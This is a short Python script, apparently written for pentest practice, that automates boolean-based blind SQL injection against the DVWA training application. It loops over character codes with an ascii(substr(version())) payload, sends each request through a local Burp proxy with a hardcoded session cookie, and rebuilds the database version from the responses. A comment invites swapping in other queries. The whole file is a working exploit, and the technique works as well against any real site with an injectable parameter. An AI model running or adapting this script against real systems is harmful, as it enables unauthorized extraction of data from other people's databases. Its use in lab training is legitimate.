#!/usr/bin/python3

import requests
import sys
from timeit import default_timer as timer

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}  #this let your script to be captured by burp
count=0

cookies = {
    'security' : 'low',
    'PHPSESSID' : 'uunhutsmeu53vge2a9snde3ma4'  #change the cookies for the one in your active session
}

def dvwa_sqli(ip, inj_str):
    global count
    for j in range(32, 126):
        target = "http://%s/vulnerabilities/sqli_blind/?id=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target,cookies=cookies, proxies=proxies)
        res = r.text
        count += 1
        if ("User ID exists in the database." in res):
            return (j)
    return None

def main():
    if len(sys.argv) != 2:
        print ("(+) usage: %s <target>" % sys.argv[0])
        print ('(+) eg: %s 192.168.121.103' % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    print ("(+) Retrieving database version....")
    start = timer()
    
    for i in range(1, 20):
        injection_string = "' or ascii(substr((version()),%d,1))=[CHAR];%%23&Submit=Submit#" % (i)   #here is the query you could to change
        extracted_char = chr(dvwa_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()

    end = timer()
    ttime = end - start
    print ("\n(+) Time (secs): ", ttime, "\n(+) Requests: ", count)   
    print ("\n(+) done!")




if __name__ == "__main__":
    main()

